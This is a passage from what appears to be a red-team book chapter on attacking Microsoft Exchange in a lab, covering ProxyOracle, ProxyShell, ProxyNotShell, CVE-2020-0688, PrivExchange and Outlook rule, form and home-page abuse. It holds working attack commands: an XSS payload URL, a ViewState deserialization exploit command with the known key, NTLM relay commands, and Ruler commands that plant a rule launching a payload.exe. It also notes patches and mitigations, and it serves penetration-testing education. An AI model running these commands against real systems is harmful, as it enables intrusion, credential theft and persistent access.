<p>Now let us <a id="_idIndexMarker055"/>cover <strong class="bold">ProxyOracle</strong>[19], which consists of the CVE-2021-31195 (Reflected Cross-Site Scripting) and CVE-2021-31196 (Padding Oracle Attack on Exchange Cookies Parsing) vulnerabilities, which allow recovering the victim’s username and <a id="_idIndexMarker056"/>password in plaintext from the cookie. To check whether the target installation is <a id="_idIndexMarker057"/>vulnerable (in our case, Exchange Server in the lab with the IP address <strong class="source-inline">192.168.56.106</strong>), try to put this payload in the browser <span class="No-Break">address bar:</span></p>
<pre class="console">
https://192.168.56.106/owa/auth/frowny.aspx?app=people&amp;et=ServerError&amp;esrc=MasterPage&amp;te=\&amp;refurl=}}};alert(document.domain)//</pre> <p>If you see a pop-up alert box, as shown in the following screenshot, you found a <span class="No-Break">vulnerable target:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer020">
<img alt="Figure 1.16 – Reflected XSS in Exchange Server is required for successful ProxyOracle exploitation" height="205" src="image/B18964_01_16.jpg" width="977"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 1.16 – Reflected XSS in Exchange Server is required for successful ProxyOracle exploitation</p>
<p>Next on our list is another <a id="_idIndexMarker058"/>pre-authenticated RCE – <strong class="bold">ProxyShell</strong>[20]. It chains three vulnerabilities: CVE-2021-34473 (pre-authenticated path confusion, which <a id="_idIndexMarker059"/>leads to <strong class="bold">Access Control List</strong> (<strong class="bold">ACL</strong>) bypass), CVE-2021-34523 (privilege elevation on the Exchange PowerShell backend), and CVE-2021-31207 (post-authentication arbitrary <span class="No-Break">file write).</span></p>
<p>In brief, the first vulnerability abuses the faulty URL normalization process in order to access an arbitrary backend URL as the Exchange machine account. The second one is the elevation of <a id="_idIndexMarker060"/>privileges by<a id="_idIndexMarker061"/> putting the Exchange admin in the <strong class="source-inline">X-Rps-CAT</strong> request parameter, which is used to restore the user identity when the <strong class="source-inline">X-CommonAccessToken</strong> header is missing. The third one is writing a shell via Exchange <span class="No-Break">PowerShell commands.</span></p>
<p>Metasploit has our back here as well with <strong class="source-inline">exploit/windows/http/exchange_proxyshell_rce</strong>. The result of the exploitation is <span class="No-Break">as follows:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer021">
<img alt="Figure 1.17 – ProxyShell successful exploitation" height="571" src="image/B18964_01_17.jpg" width="1070"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 1.17 – ProxyShell successful exploitation</p>
<p>It is time to <a id="_idIndexMarker062"/>discuss the <strong class="bold">ProxyNotShell</strong>[21] vulnerability. It is similar to ProxyShell, as it consists of a pair of vulnerabilities, which are SSRF (CVE-2022–41040) and RCE via PowerShell (CVE-2022–41082). The difference this time is that it requires the attacker to be authenticated. Again, we have an exploit available in Metasploit– <strong class="source-inline">exploit/windows/http/exchange_proxynotshell_rce</strong>. An important note is that the exploit in Metasploit is only available for Exchange 2019. We can see the<a id="_idIndexMarker063"/> result of running it against our environment <span class="No-Break">as </span><span class="No-Break"><a id="_idIndexMarker064"/></span><span class="No-Break">follows:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer022">
<img alt="Figure 1.18 – ProxyNotShell exploitation aborted due to the Exchange version" height="127" src="image/B18964_01_18.jpg" width="964"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 1.18 – ProxyNotShell exploitation aborted due to the Exchange version</p>
<p>Lastly, we will briefly <a id="_idIndexMarker065"/>talk about <strong class="bold">ProxyRelay</strong>[22] and <strong class="bold">ProxyNotRelay</strong>[23]. The first <a id="_idIndexMarker066"/>exploit is a relay attack to either another Exchange Server (no CVE), backend (CVE-2022-21979), frontend (CVE-2021-33768), or Windows DCOM (CVE-2021-26414). The idea is identical to other coerced authentication and relays that we will cover later on in this book. ProxyNotRelay is not a separate vulnerability, but more a combination of ProxyRelay <span class="No-Break">and ProxyNotShell.</span></p>
<p>Now we are going to discuss two old vulnerabilities – CVE-2020-0688 and PrivExchange (CVE-2018-8581). It is very unlikely that you will encounter them in real life, but the idea is to show other <span class="No-Break">attack surfaces.</span></p>
<p>CVE-2020-0688[24] allows<a id="_idIndexMarker067"/> an authenticated attacker to execute arbitrary code due to the fixed cryptographic keys used during Exchange installation. Let us dive a bit deeper into the details. The bug <a id="_idIndexMarker068"/>was found in the <strong class="bold">Exchange Control Panel</strong> (<strong class="bold">ECP</strong>). The <strong class="source-inline">validationKey</strong> and <strong class="source-inline">decryptionKey</strong> values are supposed to be randomly generated per installation. These keys provide security for <strong class="source-inline">ViewState</strong>, which is a method to preserve the page and control values in ASP.NET web applications. An important caveat is that <strong class="source-inline">ViewState</strong> is serialized and stored on the client side. What is serialization? In plain words, it <a id="_idIndexMarker069"/>is a process to convert complex data into a sequence of bytes with a preserved state in order to be sent or stored. If the attacker can manipulate such data by supplying their own malicious values, insecure deserialization on the server side in certain circumstances may lead <span class="No-Break">to RCE.</span></p>
<p>After logging in to ECP, an adversary collects <strong class="source-inline">ViewStateUserKey</strong> from the <strong class="source-inline">ASP.NET_SessionID</strong> cookie and the <strong class="source-inline">__VIEWSTATEGENERATOR</strong> value from the login page by simply using the browser with Dev Tools. The <strong class="source-inline">validationkey</strong> value is known (<strong class="source-inline">CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF</strong>). To generate a malicious payload for <strong class="source-inline">ViewState</strong>, we will use a tool called <strong class="source-inline">ysoserial.net</strong>[25]. This tool is a collection of known gadget chains discovered in common libraries. Gadgets are snippets of code that exist in the library code and may help the attacker to execute the payload by being executed one by one. This exploit uses the <strong class="source-inline">TextFormattingRunProperties</strong> library. We can run the following command to create a file <span class="No-Break">in </span><span class="No-Break"><strong class="source-inline">C:\</strong></span><span class="No-Break">:</span></p>
<pre class="console">
PowerShell.exe -ExecutionPolicy Bypass -File .\CVE-2020-0688.ps1 -Url https://192.168.56.106 -Username windomain\vinegrep -Password Qwerty123! -Command 'powershell whoami &gt; C:/whoami.txt' -YsoserialPath .\ysoserial\ysoserial.exe</pre> <p>The result of the execution is <span class="No-Break">as follows:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer023">
<img alt="Figure 1.19 – CVE-2020-0688 successful exploitation" height="390" src="image/B18964_01_19.jpg" width="1168"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 1.19 – CVE-2020-0688 successful exploitation</p>
<p>The file was created <span class="No-Break">in </span><span class="No-Break"><strong class="source-inline">C:\</strong></span><span class="No-Break">.</span></p>
<div>
<div class="IMG---Figure" id="_idContainer024">
<img alt="Figure 1.20 – File was created in C:\ with the output of the whoami command" height="160" src="image/B18964_01_20.jpg" width="384"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 1.20 – File was created in C:\ with the output of the whoami command</p>
<p>The second vulnerability requires <a id="_idIndexMarker070"/>three conditions and is called <strong class="bold">PrivExchange</strong>[26]. The first condition was that Exchange should have way too high privileges in the domain. The <strong class="source-inline">Exchange Windows Permissions</strong> group had <strong class="source-inline">WriteDacl</strong> permission on the domain object, which allowed the attacker to obtain <strong class="bold">DCSync</strong> rights. <strong class="bold">DCSync</strong> is a privilege that allows you to sync all the hashes in the domain. Usually, this privilege is used by domain controllers during replication. The attacker just requests a domain controller to send hashes <span class="No-Break">for synchronization.</span></p>
<p>The second <a id="_idIndexMarker071"/>condition <a id="_idIndexMarker072"/>was the possibility of NTLM relay for machine accounts and the third was that the attacker could force Exchange to authenticate against the listener via the <strong class="source-inline">PushSubscription</strong> feature. We will discuss relay in more detail in <a href="B18964_05.xhtml#_idTextAnchor093"><span class="No-Break"><em class="italic">Chapter 5</em></span></a><span class="No-Break">.</span></p>
<p>Let us run the attack by using the <strong class="source-inline">ntlmrelayx</strong> tool and the <span class="No-Break"><strong class="source-inline">privexchange</strong></span><span class="No-Break"> exploit[27]:</span></p>
<pre class="console">
python privexchange.py -ah 192.168.56.100 exchange.windomain.local -u vinegrep -d windomain.local
ntlmrelayx.py -t ldap://192.168.56.102 --escalate-user vinegrep</pre> <p>The result of the command is as follows. It’s important to mention that the user should have a mailbox on <span class="No-Break">Exchange Server:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer025">
<img alt="Figure 1.21 – PushSubscription API call was successful" height="142" src="image/B18964_01_21.jpg" width="815"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 1.21 – PushSubscription API call was successful</p>
<p>As we deployed<a id="_idIndexMarker073"/> Exchange Server 2016 CU12, it is <a id="_idIndexMarker074"/>not vulnerable to this attack. Microsoft removed the automatic authentication of Exchange when sending out notifications. Also, Exchange permissions <span class="No-Break">were reduced.</span></p>
<p>The next section will be about getting an initial foothold in the organization via Outlook rules, forms, and the <span class="No-Break">home page.</span></p>
<h2 id="_idParaDest-23"><a id="_idTextAnchor022"/>Gaining a foothold</h2>
<p>In this section, we will <a id="_idIndexMarker075"/>discuss ways to achieve RCE after mailbox compromise – via rules, forms, and the folder home page. These methods can still work if Outlook is not patched. An important note is that we are talking about client-side rules <span class="No-Break">in Outlook.</span></p>
<p>Let us start with Outlook rules[28]. Rules are stored in Exchange Server and the new Outlook instance receives all existing rules. We are interested in the action part of the rule and what triggers it. When we create a rule, two actions look promising: start application and run script. To execute the attack, we need a valid set of credentials, MAPI over HTTP enabled, and a malicious file dropped on disk or accessible via the UNC path (WebDAV can be used as well). This attack will not work on patched Outlook 2016 and upward. To perform this attack, we can use a tool called Ruler[29]. The following command will create a rule and trigger it after <span class="No-Break">30 seconds:</span></p>
<pre class="console">
./ruler -u vinegrep -p 'Qwerty123!' -d windomain.local -e vinegrep@windomain.local -k --url https://192.168.56.106/autodiscover/autodiscover.xml --verbose –-debug add --trigger "vinegrep" --name evil --location \\\\192.168.56.100:8000\\payload.exe --send</pre> <p>The rule was <span class="No-Break">successfully created:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer026">
<img alt="Figure 1.22 – Creating a rule" height="348" src="image/B18964_01_22.jpg" width="1202"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 1.22 – Creating a rule</p>
<p>Two important <a id="_idIndexMarker076"/>caveats are that we can’t provide command-line arguments and outgoing WebDAV traffic needs to be allowed. Also, after the Microsoft patch (KB3191938) in June 2013 for Outlook[30], rules to run both an application and a script were disabled <span class="No-Break">by default.</span></p>
<p>Next, we will cover Outlook forms[31]. It was introduced after the Rule vector was killed by Microsoft. The idea is that we can create our own form with VBScript code inside. Luckily, this script engine is separate from the VBA Macro script engine, so disabling macros will not help. To trigger the form remotely, we need to send an email of the correct message class. We need to create the same form in Outlook. This technique is a great way to achieve persistence. Even if the victim changes the password, we can just send an email and get our shell. To run this attack, we can use <span class="No-Break">Ruler again:</span></p>
<pre class="console">
./ruler -e vinegrep@windomain.local form add --suffix evil --input /tmp/command.txt --send
./ruler -e vinegrep@windomain.local form send --prefix evil</pre> <p>In September 2017, when the KB4011091 update for Outlook[32] was published, the custom form script vector <span class="No-Break">was destroyed.</span></p>
<p>There is a third vector to discuss, called the Outlook home page[33]. The home page allows us to customize the default view for any folder by specifying a URL to be loaded and displayed when the folder is open. Code execution comes from the <strong class="source-inline">OutlookViewCtl</strong> CLSID (<strong class="source-inline">0006F063-0000-0000-C000-000000000046</strong>) embedded as an object and available in the <strong class="source-inline">CreateObject</strong> method. All we need is to create our custom home <a id="_idIndexMarker077"/>page and, with the help of ruler, set it for <span class="No-Break">the user:</span></p>
<pre class="console">
./ruler -u vinegrep -p 'Qwerty123!' -d windomain.local -e vinegrep@windomain.local -k --url https://192.168.56.106/autodiscover/autodiscover.xml --verbose --debug homepage add --url http://192.168.56.106/homepage.xhtml</pre> <p>The result of the command execution can be seen in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer027">
<img alt="Figure 1.23 – Setting the Outlook home page" height="257" src="image/B18964_01_23.jpg" width="1204"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 1.23 – Setting the Outlook home page</p>
<p>Microsoft killed this vector completely by removing the home page feature in the KB4011162 update in October 2017[34]. Reducing the attack surface is the best way to <span class="No-Break">fix issues.</span></p>
<p>In this section, we discussed different attack vectors against Exchange Server. To mitigate password spray attacks, MFA and appropriate login monitoring are required. All RCE vulnerabilities sooner or later received patches. It is also necessary to patch client software, as it can be abused for lateral movement <span class="No-Break">and persistence.</span></p>
<h1 id="_idParaDest-24"><a id="_idTextAnchor023"/>Summary</h1>
<p>In this chapter, we deployed our lab for future activities. We are lucky to have two outstanding free projects available for training and research purposes. After that, we discussed the Active Directory kill chain, vital steps to compromise the target environment, and what OpSec is. Then, we dived deeper into the assume breach model, showing solid hurdles that need to be overcome to achieve stable initial access. We covered three main attack vectors for Exchange Server: credential access, Zero2Hero exploits, and abuse of client-side software. In the next chapter, we will scratch the surface of the defense evasion theme. It is a broad and deep topic, which you will see eventually narrows down to the rule <em class="italic">know </em><span class="No-Break"><em class="italic">your tooling</em></span><span class="No-Break">.</span></p>
<h1 id="_idParaDest-25"><a id="_idTextAnchor024"/>Further reading</h1>
<p>The following resources for further study will help you dive deeper into the attacks covered in <span class="No-Break">the chapter:</span></p>
<ol>
<li>Splunk Attack Range – <a href="https://github.com/splunk/attack_range"><span class="No-Break">https://github.com/splunk/attack_range</span></a></li>
<li>Orange Cyberdefense GOADv2 – <a href="https://github.com/Orange-Cyberdefense/GOAD"><span class="No-Break">https://github.com/Orange-Cyberdefense/GOAD</span></a></li>
<li>Deploy GOADv2 on Proxmox – <a href="https://mayfly277.github.io/categories/proxmox/"><span class="No-Break">https://mayfly277.github.io/categories/proxmox/</span></a></li>
<li>DetectionLab project – <a href="https://www.detectionlab.network/"><span class="No-Break">https://www.detectionlab.network/</span></a></li>
<li>Active Directory kill chain diagram – <a href="https://github.com/infosecn1nja/AD-Attack-Defense"><span class="No-Break">https://github.com/infosecn1nja/AD-Attack-Defense</span></a></li>
<li>Red team infrastructure wiki – <a href="https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki"><span class="No-Break">https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki</span></a></li>
<li>EDR bypass team – <a href="https://dispatch.redteams.fyi/red-team-edr-bypass-team/"><span class="No-Break">https://dispatch.redteams.fyi/red-team-edr-bypass-team/</span></a></li>
<li>Assume breach model – <a href="https://www.redsiege.com/wp-content/uploads/2019/09/AssumedBreach-ABM.pdf"><span class="No-Break">https://www.redsiege.com/wp-content/uploads/2019/09/AssumedBreach-ABM.pdf</span></a></li>
<li>Mind map to assess the security of Exchange Server – <a href="https://github.com/Orange-Cyberdefense/arsenal/blob/master/mindmap/Pentesting_MS_Exchange_Server_on_the_Perimeter.png"><span class="No-Break">https://github.com/Orange-Cyberdefense/arsenal/blob/master/mindmap/Pentesting_MS_Exchange_Server_on_the_Perimeter.png</span></a></li>
<li>MailSniper – <a href="https://github.com/dafthack/MailSniper"><span class="No-Break">https://github.com/dafthack/MailSniper</span></a></li>
<li>NameMash – <a href="https://gist.github.com/superkojiman/11076951#file-namemash-py"><span class="No-Break">https://gist.github.com/superkojiman/11076951#file-namemash-py</span></a></li>
<li>EmailAddressMangler – <a href="https://github.com/dafthack/EmailAddressMangler"><span class="No-Break">https://github.com/dafthack/EmailAddressMangler</span></a></li>
<li>OABurl extraction script by <em class="italic">snovvcrash</em> – <a href="https://gist.github.com/snovvcrash/4e76aaf2a8750922f546eed81aa51438#file-oaburl-py"><span class="No-Break">https://gist.github.com/snovvcrash/4e76aaf2a8750922f546eed81aa51438#file-oaburl-py</span></a></li>
<li>Attacking Exchange web interfaces – <a href="https://swarm.ptsecurity.com/attacking-ms-exchange-web-interfaces/"><span class="No-Break">https://swarm.ptsecurity.com/attacking-ms-exchange-web-interfaces/</span></a></li>
<li>PEAS: Python 2 library and application to run commands on Exchange Server – <a href="https://github.com/snovvcrash/peas"><span class="No-Break">https://github.com/snovvcrash/peas</span></a></li>
<li>MWR ActiveSync exfiltration research – <a href="https://labs.withsecure.com/publications/accessing-internal-fileshares-through-exchange-activesync"><span class="No-Break">https://labs.withsecure.com/publications/accessing-internal-fileshares-through-exchange-activesync</span></a></li>
<li>ProxyLogon vulnerability discovery – <a href="https://devco.re/blog/2021/08/06/a-new-attack-surface-on-MS-exchange-part-1-ProxyLogon/"><span class="No-Break">https://devco.re/blog/2021/08/06/a-new-attack-surface-on-MS-exchange-part-1-ProxyLogon/</span></a></li>
<li>Hunting ProxyLogon – <a href="https://bi-zone.medium.com/hunting-down-ms-exchange-attacks-part-1-proxylogon-cve-2021-26855-26858-27065-26857-6e885c5f197c"><span class="No-Break">https://bi-zone.medium.com/hunting-down-ms-exchange-attacks-part-1-proxylogon-cve-2021-26855-26858-27065-26857-6e885c5f197c</span></a></li>
<li>Blog post from a vulnerability researcher who discovered ProxyOracle – <a href="https://devco.re/blog/2021/08/06/a-new-attack-surface-on-MS-exchange-part-2-ProxyOracle/"><span class="No-Break">https://devco.re/blog/2021/08/06/a-new-attack-surface-on-MS-exchange-part-2-ProxyOracle/</span></a></li>
<li>A full write-up about ProxyShell is available on the ZDI blog post here – <a href="https://www.zerodayinitiative.com/blog/2021/8/17/from-pwn2own-2021-a-new-attack-surface-on-microsoft-exchange-proxyshell"><span class="No-Break">https://www.zerodayinitiative.com/blog/2021/8/17/from-pwn2own-2021-a-new-attack-surface-on-microsoft-exchange-proxyshell</span></a></li>
<li>Blog post by Palo Alto covering the ProxyNotShell vulnerability – <a href="https://unit42.paloaltonetworks.com/proxynotshell-cve-2022-41040-cve-2022-41082/"><span class="No-Break">https://unit42.paloaltonetworks.com/proxynotshell-cve-2022-41040-cve-2022-41082/</span></a></li>
<li>ProxyRelay author covers details of the vulnerability – <a href="https://devco.re/blog/2022/10/19/a-new-attack-surface-on-MS-exchange-part-4-ProxyRelay/"><span class="No-Break">https://devco.re/blog/2022/10/19/a-new-attack-surface-on-MS-exchange-part-4-ProxyRelay/</span></a></li>
<li>Write-up about ProxyNotRelay, which is a combination of ProxyRelay and ProxyNotShell – <a href="https://rw.md/2022/11/09/ProxyNotRelay.xhtml"><span class="No-Break">https://rw.md/2022/11/09/ProxyNotRelay.xhtml</span></a></li>
<li>Vulnerability CVE-2020-0688 leads to remote code execution on Exchange Server – <a href="https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys"><span class="No-Break">https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys</span></a></li>
<li>Ysoserial.net – <a href="https://github.com/pwntester/ysoserial.net"><span class="No-Break">https://github.com/pwntester/ysoserial.net</span></a></li>
<li>Original research about the PrivExchange vulnerability – <a href="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/"><span class="No-Break">https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/</span></a></li>
<li>PrivExchange – <a href="https://github.com/dirkjanm/privexchange/"><span class="No-Break">https://github.com/dirkjanm/privexchange/</span></a></li>
<li>Compromise workstations through Outlook mail rules – <a href="https://sensepost.com/blog/2016/mapi-over-http-and-mailrule-pwnage/"><span class="No-Break">https://sensepost.com/blog/2016/mapi-over-http-and-mailrule-pwnage/</span></a></li>
<li>Ruler tool – <a href="https://github.com/sensepost/ruler"><span class="No-Break">https://github.com/sensepost/ruler</span></a></li>
<li>Microsoft bulletin KB3191938 – <a href="https://support.microsoft.com/en-us/topic/description-of-the-security-update-for-outlook-2013-june-13-2017-d52f7b9a-488c-dd5a-0d43-da5832eaac5f"><span class="No-Break">https://support.microsoft.com/en-us/topic/description-of-the-security-update-for-outlook-2013-june-13-2017-d52f7b9a-488c-dd5a-0d43-da5832eaac5f</span></a></li>
<li>Outlook Forms to achieve persistence – <a href="https://sensepost.com/blog/2017/outlook-forms-and-shells/"><span class="No-Break">https://sensepost.com/blog/2017/outlook-forms-and-shells/</span></a></li>
<li>Microsoft bulletin KB4011091 – <a href="https://support.microsoft.com/en-us/office/custom-form-script-is-now-disabled-by-default-bd8ea308-733f-4728-bfcc-d7cce0120e94"><span class="No-Break">https://support.microsoft.com/en-us/office/custom-form-script-is-now-disabled-by-default-bd8ea308-733f-4728-bfcc-d7cce0120e94</span></a></li>
<li>Outlook home page functionality abuse – <a href="https://sensepost.com/blog/2017/outlook-home-page-another-ruler-vector/"><span class="No-Break">https://sensepost.com/blog/2017/outlook-home-page-another-ruler-vector/</span></a></li>
<li>Microsoft bulletin KB15599094 – <a href="https://learn.microsoft.com/en-us/mem/configmgr/hotfix/2207/15599094"><span class="No-Break">https://learn.microsoft.com/en-us/mem/configmgr/hotfix/2207/15599094</span></a></li>
</ol>
</div>
</div></body></html>